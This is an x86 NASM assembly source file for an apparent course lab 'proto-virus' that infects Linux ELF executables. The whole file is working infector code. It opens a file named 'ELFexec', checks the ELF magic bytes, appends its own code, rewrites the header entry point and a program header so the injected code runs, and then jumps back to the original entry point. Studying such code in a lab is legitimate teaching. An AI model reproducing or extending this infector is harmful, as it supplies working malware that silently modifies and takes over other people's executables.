%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define DPHDR_size  64

%define STDOUT 1
%define STDERR 2

%define magic 4
%define Elf32_Ehdr 116
%define Elf32_Ehdr_size 52
%define backup 120

	
	global _start

	section .text
	

    
_start:push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

    
    print_vir_msg:
        call get_my_loc
        add ecx, OutStr-next_i
        write STDOUT,ecx,32
        
    open_ELFexec_file:
        xor ecx,ecx
        call get_my_loc
        add ecx, FileName-next_i
        mov ebx, ecx
        open ebx,RDWR,00777
        mov edi, eax        ;edi will hold the file descriptor
    
    check_open_file:
        cmp edi,0          ;if edi == -1 an error occurred during open syscall1
        jl ErrorExit
        
    check_Elf_File:
        lea esi, [ebp-magic]
        read edi,esi,magic
        mov dword esi,[esi]     ; esi holds 4 magic ELF file bytes
        cmp dword esi,0x464c457f    ;check if the file is an Elf file
        jne ErrorExit
        
    go_to_end_of_file:
        lseek edi,0,SEEK_END
        cmp eax,0
        jl ErrorExit
        
    write_into_file:
        mov esi,virus_end-_start      ;Virus Size 
        call get_my_loc
        add ecx, _start-next_i
        write edi,ecx,esi
        cmp eax,0
        jle ErrorExit
        lseek edi,0,SEEK_SET            ;return pointer to the file beginning
        
        
    
    copy_Elf_header:
        lea esi,[ebp-Elf32_Ehdr]
        read edi,esi,Elf32_Ehdr_size
        cmp eax,0
        jle ErrorExit
        
    copy_program_headers:
        lea esi, [ebp-DPHDR_size]                   ;buffer pointer
        mov dword ecx, [ebp-Elf32_Ehdr+PHDR_start]   ;ecx=e_phoff
        lseek edi,ecx,SEEK_SET                       ;get ph start
        cmp eax,0
        jle ErrorExit
        read edi, esi, DPHDR_size
        cmp eax,DPHDR_size
        jl ErrorExit
         
    
    backup_orig_entry_point:
        mov dword esi, [ebp-Elf32_Ehdr+ENTRY]
        mov dword [ebp-backup],esi
    
    modify_entry_point:
        call get_file_size
        sub esi, virus_end-_start
        mov dword eax,[ebp-PHDR_size+PHDR_vaddr]    ;second program header vaddr
        add esi,eax                                 ; second program header vaddr +orig_file size
        mov dword eax,[ebp-PHDR_size+PHDR_offset]
        sub esi,eax                                 ;second program header vaddr+orig_file size-second program header offset
        mov dword [ebp-Elf32_Ehdr+ENTRY],esi
        
    change_orig_entry:
        lea esi,[ebp-Elf32_Ehdr]
        write edi,esi,Elf32_Ehdr_size
        cmp eax,0
        jle ErrorExit
        
    modify_PreviousEntryPoint:
        call get_file_size
        sub esi,virus_end-PreviousEntryPoint        ;PreviousEntryPoint offset at the modified file
        lseek edi,esi,SEEK_SET
        lea esi,[ebp-backup]
        mov dword eax, [esi]
        write edi,esi,4
        cmp eax,0
        jle ErrorExit
     
    modify_second_PH:
        call get_file_size                      ;esi= file size+virus size
        lea eax,[ebp-PHDR_size]                 ;second program header
        sub dword esi, [eax+PHDR_offset]
        mov dword [eax+PHDR_filesize],esi       
        mov dword [eax+PHDR_memsize],esi        
        
    write_second_PH_to_file:
        mov dword ecx, [ebp-Elf32_Ehdr+PHDR_start]   ;ecx=e_phoff
        add ecx,PHDR_size
        lseek edi,ecx,SEEK_SET
        cmp eax,0
        jle ErrorExit
        lea esi,[ebp-PHDR_size]
        write edi,esi,PHDR_size
        cmp eax,PHDR_size
        jl ErrorExit

        
        
    close_file_and_jmp:
        close edi
        cmp eax,0
        jl ErrorExit
        call get_my_loc
        add ecx, PreviousEntryPoint-next_i
        jmp [ecx]
        
        
        
  get_file_size:
    lseek edi,0,SEEK_SET       ;to get file size
    lseek edi,0,SEEK_END
    cmp eax,0
    jl ErrorExit
    mov esi,eax
    lseek edi,0,SEEK_SET
    ret
  
    
ErrorExit:
    xor ecx,ecx
    call get_my_loc
    add ecx, Failstr-next_i
    write STDERR,ecx,13
    exit 1
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0       ;8;32 chars
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0 ;32 chars
Failstr:        db "perhaps not", 10 , 0    ;13 chars
	
PreviousEntryPoint: dd VirusExit
get_my_loc:
    call next_i
next_i:
    pop ecx
    ret
virus_end:


